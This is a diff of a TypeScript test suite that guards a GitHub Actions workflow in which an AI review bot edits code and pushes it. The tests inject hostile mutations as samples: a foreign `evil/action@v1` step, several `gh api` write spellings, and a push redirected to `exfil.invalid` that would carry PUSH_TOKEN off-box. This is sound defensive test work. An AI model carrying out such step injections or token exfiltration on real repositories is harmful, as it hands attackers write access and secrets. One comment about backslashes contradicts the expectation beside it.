+      ['      -\n        name: Publish the fold\n        run: |\n          echo hi\n', true],
+      ['      -\n        uses: evil/action@v1\n', true],
+    ] as Array<[string, boolean]>) {
       const mutated = src.replace(
         /^ {6}- name: Report skill-fetch failure$/m,
         `${injected}      - name: Report skill-fetch failure`
       );
+      const label = injected.split('\n')[0];
       expect(mutated, 'the step injection anchor moved').not.toBe(src);
-      expect(stepNames(mutated), `a new step was not seen: ${injected.split('\n')[0]}`).toHaveLength(21);
+      expect(stepNames(mutated), `a new step was not seen: ${label}`).toHaveLength(21);
+      if (unnamed) expect(stepNames(mutated), `a name-less step was not seen: ${label}`).toContain(UNNAMED_STEP);
     }
   });
 
@@ -2226,6 +2530,121 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
       "steps.fold_push.outcome == 'success'",
       "(steps.fold_push.outputs.pushed == 'none' || steps.fold_push.outputs.dropped != '')",
     ]);
+    // And the two overlap-free halves of the ONE pair that used to collide, pinned by value on
+    // both sides: the cancellation test is in `Report cancelled fold` and its negation is in
+    // `Report incomplete review`, so a rewrite that drops either puts both back on the same
+    // state. A `toMatch` cannot tell this conjunct from one disarmed with `|| true`.
+    expect(ifLine(src, 'Report incomplete review')).toBe(
+      "always() && !(cancelled() && env.FOLD_MODE == 'true') && (steps.bot_review.outcome == 'failure' || (steps.bot_review.outcome == 'success' && steps.bot_review.outputs.conclusion == 'success')) && steps.review_posted.outputs.posted != 'true'"
+    );
+    const noGuard = src.replace("always() && !(cancelled() && env.FOLD_MODE == 'true') && ", 'always() && ');
+    expect(noGuard, 'the cancellation-guard anchor moved').not.toBe(src);
+    expect(ifLine(noGuard, 'Report incomplete review')).toMatch(/^always\(\) && \(steps\.bot_review\.outcome/);
+  });
+
+  type StepState = {
+    cancelled: boolean;
+    foldMode: boolean;
+    steps: Record<string, { outcome?: string; outputs?: Record<string, string> }>;
+  };
+
+  /**
+   * Evaluates a step's `if:` on a state, by handing the SHIPPED condition text to the JS engine.
+   *
+   * GitHub's `if:` syntax for these gates is a subset of JavaScript - `always()`, `cancelled()`,
+   * dot paths, `==`, `&&`, `||`, `!` - so the real string evaluates directly rather than being
+   * re-modelled. That distinction is the whole point: a hand-written predicate per reporter would
+   * be a second copy of the gate to drift from, which is the defect class this file keeps
+   * re-finding. The condition is trusted content from the same commit as this test; a condition
+   * using anything the JS engine cannot parse fails LOUDLY here rather than being skipped.
+   */
+  function stepFires(src: string, name: string, state: StepState): boolean {
+    const condition =
+      step(src, name).match(/^ {8}if: (?![|>])(.*)$/m)?.[1] ??
+      step(src, name).match(/^ {8}if: \|\n((?: {10}.*\n)+)/m)?.[1];
+    expect(condition, `${name}: no if:`).toBeTruthy();
+    const env = { FOLD_MODE: state.foldMode ? 'true' : 'false' };
+    const evaluate = new Function('always', 'cancelled', 'env', 'steps', `return (${condition});`);
+    return Boolean(
+      evaluate(
+        () => true,
+        () => state.cancelled,
+        env,
+        state.steps
+      )
+    );
+  }
+
+  it('fires at most one reporting comment on any state, and names the one it should', () => {
+    // The cross-product the gate comments describe, EXECUTED rather than argued. Every reporter
+    // reachable once the review step has run is included, so "at most one" is a property of that
+    // whole set rather than of a pair - the collision this exists for was between two steps whose
+    // comments had been reconciled in prose only. The two remaining commenters (the size-guard
+    // skip and the changeset-only skip) are gated on `skip == 'true'`, which is mutually
+    // exclusive with `bot_review.outcome == 'success'` here and is pinned by their own gates.
+    const reporters = [
+      'Report fold failure',
+      'Report cancelled fold',
+      'Report fold no-op',
+      'Report incomplete review',
+      'Report skill-fetch failure',
+    ];
+    // `bot_review` is held at the shape claude-code-action leaves on a successful review and
+    // `skill_fetch` at success, so the four booleans below are the only axes that move.
+    const state = (cancelled: boolean, posted: boolean, minted: boolean, pushed: boolean): StepState => ({
+      cancelled,
+      foldMode: true,
+      steps: {
+        bot_review: { outcome: 'success', outputs: { conclusion: 'success' } },
+        skill_fetch: { outcome: 'success' },
+        review_posted: { outcome: 'success', outputs: { posted: posted ? 'true' : '' } },
+        push_token: { outcome: minted ? 'success' : 'failure' },
+        fold_push: {
+          outcome: pushed ? 'success' : 'failure',
+          outputs: { pushed: pushed ? 'true' : 'blocked', dropped: '' },
+        },
+      },
+    });
+    const firing = (s: StepState) => reporters.filter(name => stepFires(src, name, s));
+
+    for (const cancelled of [false, true]) {
+      for (const posted of [false, true]) {
+        for (const minted of [false, true]) {
+          for (const pushed of [false, true]) {
+            const on = firing(state(cancelled, posted, minted, pushed));
+            expect(
+              on.length,
+              `more than one reporter commented: ${on.join(', ')} - cancelled=${cancelled} posted=${posted} minted=${minted} pushed=${pushed}`
+            ).toBeLessThan(2);
+          }
+        }
+      }
+    }
+
+    // And the rows that have to name a specific reporter, so "at most one" is not satisfied by
+    // nothing firing. The first is the collision: a cancel landing before the review was measured.
+    expect(firing(state(true, false, true, true))).toEqual(['Report cancelled fold']);
+    expect(firing(state(true, true, true, true))).toEqual(['Report cancelled fold']);
+    expect(firing(state(false, false, true, true))).toEqual(['Report incomplete review']);
+    expect(firing(state(false, true, false, true))).toEqual(['Report fold failure']);
+    expect(firing(state(false, true, true, false))).toEqual(['Report fold failure']);
+    // The happy path is the one tuple that correctly comments nothing.
+    expect(firing(state(false, true, true, true))).toEqual([]);
+    // `Report fold no-op` covers both of its arms.
+    for (const outputs of [
+      { pushed: 'none', dropped: '' },
+      { pushed: 'true', dropped: 'src/dropped.ts' },
+    ]) {
+      const s = state(false, true, true, true);
+      s.steps.fold_push = { outcome: 'success', outputs };
+      expect(firing(s)).toEqual(['Report fold no-op']);
+    }
+    // A failed skill fetch skips the review step, which is the shape the fifth reporter exists
+    // for - and the review-step gates are all false on it, so it cannot double up.
+    const skipped = state(false, false, false, false);
+    skipped.steps.skill_fetch = { outcome: 'failure' };
+    skipped.steps.bot_review = { outcome: 'skipped', outputs: {} };
+    expect(firing(skipped)).toEqual(['Report skill-fetch failure']);
   });
 
   it('commits only tracked-file edits, and fails rather than falling through', () => {
@@ -2295,12 +2714,15 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
     // `jq -f <path>` names one and is exempted by `DATA_ONLY_COMMANDS` (the shipped invocation
     // is pinned by value just below, the FLAG is not bounded), and `sudo` runs upstream of the
     // agent; `python3` runs only as `-I -` fed from the object store, pinned separately.
-    // Quotes are stripped by the parser, so two spellings of one program text collapse to the
-    // same entry here. That merges `-F'\t'` with `-F"\t"` and nothing else: inserting quote
-    // characters cannot introduce a `system(` or a `print | "sh"` that was not already there.
+    // Quotes are removed the way the SHELL removes them, so the pinned rows are the words awk
+    // actually receives: the double quotes inside the program text survive, because the shell
+    // keeps them - they are inside single quotes - and stripping them here would be reading a
+    // program awk never runs. Two spellings of one word still collapse when the shell would
+    // produce the same word (`-F'\t'` and `-F"\t"` both), which is what makes the pin a bound on
+    // the PROGRAM rather than on its punctuation.
     expect(commandsNamed(src, /^awk$/)).toEqual([
-      ['awk', '-F\\t', '$1 == - { print $3 }', '$STAGED_NUMSTAT'],
-      ['awk', '{ n += ($1 == - ? 0 : $1) + ($2 == - ? 0 : $2) } END { print n + 0 }'],
+      ['awk', '-F\\t', '$1 == "-" { print $3 }', '$STAGED_NUMSTAT'],
+      ['awk', '{ n += ($1 == "-" ? 0 : $1) + ($2 == "-" ? 0 : $2) } END { print n + 0 }'],
     ]);
     // POSITIVE CONTROL for that pin, along its own axis: a by-value `toEqual` is only a bound
     // if a THIRD invocation reaches it, and `awk` is reported as a program only when the
@@ -2322,16 +2744,17 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
     // so the tree-execution sweep exempts it by name. `apt-get` runs arbitrary maintainer
     // scripts as root; it is upstream of the agent, which is what makes the shipped pair safe
     // rather than anything about the command, so a THIRD one has to be justified here.
-    // Quotes are stripped by the parser, so the program text is pinned as the shell passes
-    // it, and the redirection words are kept: a `2>` appearing where one did not is a change
-    // to where this command's output goes.
+    // The program text is pinned as the SHELL passes it. The filter is single-quoted in the
+    // workflow, so the double quotes inside it are part of the string jq receives and are kept
+    // here - stripping them would pin a program that never runs. The redirection words are kept
+    // too: a `2>` appearing where one did not is a change to where this command's output goes.
     expect(commandsNamed(src, /^jq$/)).toEqual([
       [
         'jq',
         '-s',
         '-e',
-        'map(if type == array then .[] else . end)\n' +
-          '                       | any(.[]; (.message.content? // []) | any(.[]?; .type == tool_use and .name == ScheduleWakeup))',
+        'map(if type == "array" then .[] else . end)\n' +
+          '                       | any(.[]; (.message.content? // []) | any(.[]?; .type == "tool_use" and .name == "ScheduleWakeup"))',
         '$DEST',
         '>/dev/null',
         '2>',
@@ -2368,19 +2791,27 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
     // `(=|$)`, not `$`: `gh` accepts `--method=PUT` as readily as `--method PUT`, and this
     // file's own `takesValue` logic already treats `--opt=value` as a spelling of the flag, so
     // the anchored form made the asymmetry internal to this file rather than a limit of `gh`.
+    //
+    // Both halves of the spelling. The long flags are matched with `=` or end-of-word; the SHORT
+    // ones are matched with anything after them, because `gh`'s flag parser (cobra/pflag) accepts
+    // a shorthand's value GLUED to it - `-XPUT`, `-fcontent=y` - and an anchored `(=|$)` reads
+    // those as neither a flag nor a value. Verified against the live CLI, not from memory.
     const ghWrites = (text: string) =>
       commandsNamed(text, /^gh$/)
-        .filter(words => words.some(word => /^(-X|--method|--input|-f|-F|--field|--raw-field)(=|$)/.test(word)))
+        .filter(words => words.some(word => /^(-[XfF].*|--(?:method|input|field|raw-field)(?:=|$))/.test(word)))
         .map(words => words.join(' '));
     expect(ghWrites(src)).toEqual([]);
     // POSITIVE CONTROL, along that axis. Every `=`-spelled entry carries NO space-spelled flag:
     // with `--method=PUT ... -f content=y` the `-f` matches the anchored form too, so the
-    // control passed against the defect it was written for and proved nothing.
+    // control passed against the defect it was written for and proved nothing. The last two are
+    // the glued shorthands, which carry no separator for an anchored match to find.
     for (const spelling of [
       'gh api --method PUT repos/$REPO/contents/x -f content=y',
       'gh api --method=PUT repos/$REPO/contents/x --field=content=y',
       'gh api --raw-field=content=y repos/$REPO/contents/x',
       "'env' gh api --input=- repos/$REPO/contents/x",
+      'gh api -XPUT repos/$REPO/contents/x -fcontent=y',
+      'gh api -XPOST -Fcontent=@payload repos/$REPO/contents/x',
     ]) {
       const mutated = src.replace(
         /^ {6}- name: Report skill-fetch failure$/m,
@@ -2672,9 +3103,16 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
 
     // And the DESTINATION, which bounding the ref does not bound: `remoteRefs` reads the
     // scratch remote, so a body pointed at another host leaves it untouched and every
-    // assertion above passes while the executed body ships PUSH_TOKEN off-box. Fed a mutated
-    // `src` rather than injected into the workflow, because the by-value pin on `gitPushes`
-    // catches that mutation first and would mask which assertion is doing the work here.
+    // assertion above passes while the executed body ships PUSH_TOKEN off-box.
+    //
+    // This is a CONTROL ON THE HARNESS, not the bound. The bound on where a fold may push is the
+    // by-value pin on `gitPushes` above - the destination URL is one of its argv elements - and
+    // this assertion makes the harness refuse an unredirected remote rather than observe a
+    // scratch repo the executed body never touched. Read it that way: deleting this line does not
+    // reopen the destination, it only removes the fidelity check that would have caught the
+    // harness lying. Fed a mutated `src` rather than injected into the workflow for the same
+    // reason - the `gitPushes` pin catches that mutation first and would mask which assertion is
+    // doing the work.
     const exfil = runPushStep(src.replace('@github.com/${REPO}.git', '@exfil.invalid/${REPO}.git'), {
       edits: [{ path: 'src/a.ts', lines: 4 }],
     });
@@ -2684,14 +3122,15 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
   });
 
   // `unquoteWord` is the normaliser every prefix loop and program sweep runs a shell word
-  // through, so a word it under-strips is a bound that silently does not apply. Pinned
-  // directly because the spellings matrix only instantiates the single-pair shape, while the
-  // failure this helper was rewritten to fix lives in ADJACENT quotes: under the lookbehind
-  // form the character before a quote is CONSUMED by the match, so the second of two adjacent
-  // quotes cannot match. `''env'' git push` is the same command to the shell, and under that
-  // form it keeps a stray quote, which makes SHELL_PREFIX miss the prefix and leaves the push
-  // outside every by-value bound keyed on the program.
-  it('strips shell quoting the way the shell does, including adjacent quotes', () => {
+  // through, so a word it under-strips is a bound that silently does not apply. Pinned directly
+  // because the spellings matrix only instantiates the single-pair shape, while the two failures
+  // that matter are in shapes it never produces: ADJACENT quotes, where the lookbehind form
+  // CONSUMED the character before a quote and so could not match the second of two, and a
+  // BACKSLASH outside single quotes, where the pair-preserving form kept the escape the shell
+  // removes. `''env'' git push` and `\env git push` are each the same command as `env git push`,
+  // and each of those forms left a stray character that makes SHELL_PREFIX miss the prefix -
+  // putting the push outside every by-value bound keyed on the program.
+  it('strips shell quoting the way the shell does, adjacent quotes and backslashes included', () => {
     const cases: Array<[string, string]> = [
       ['git', 'git'],
       ["'env'", 'env'],
@@ -2700,18 +3139,30 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
       ['""', ''],
       ['\'ti\'"me"', 'time'],
       ["'a'''b'", 'ab'],
-      ["\\'", "\\'"],
-      ["a\\'b", "a\\'b"],
+      // Outside quotes a backslash escapes the NEXT character, which the shell then runs: the
+      // word `\'` is the word `'`, and `a\'b` is `a'b`.
+      ["\\'", "'"],
+      ["a\\'b", "a'b"],
+      // The other direction, so the rule is not "delete every backslash": inside DOUBLE quotes
+      // a backslash only escapes `"`, `$`, backtick and itself, so `"a\b"` keeps it.
+      ['"a\\b"', 'a\\b'],
+      // And it survives where bash keeps it too, before an ordinary character.
+      ['\\a', 'a'],
     ];
     for (const [input, expected] of cases) {
       expect([input, unquoteWord(input)]).toEqual([input, expected]);
     }
 
-    // Paired control: the superseded lookbehind form agrees on every row EXCEPT the adjacent-
-    // quote ones, so those rows - not the helper merely being called - are what this holds.
+    // Paired controls, one per form this helper has shipped or nearly shipped. Each names the
+    // rows it gets wrong, so the assertion above is shown to hold those rows rather than to hold
+    // that the helper was called. The first is the lookbehind form this file carried until the
+    // adjacent-quote rewrite; the second is the pair-preserving form it carried BEFORE that.
+    const diverges = (impl: (word: string) => string) =>
+      cases.filter(([input, expected]) => impl(input) !== expected).map(([input]) => input);
     const lookbehind = (word: string) => word.replace(/(^|[^\\])['"]/g, (_match, before) => before);
-    const diverges = cases.filter(([input, expected]) => lookbehind(input) !== expected).map(([input]) => input);
-    expect(diverges).toEqual(["''", '""', '\'ti\'"me"', "'a'''b'"]);
+    expect(diverges(lookbehind)).toEqual(["''", '""', '\'ti\'"me"', "'a'''b'", "\\'", "a\\'b", '\\a']);
+    const pairKeeping = (word: string) => word.replace(/\\.|['"]/g, match => (match.length === 2 ? match : ''));
+    expect(diverges(pairKeeping)).toEqual(["\\'", "a\\'b", '\\a']);
   });
 
   it('pushes non-force to the PR head ref, with a token the checkout never held', () => {
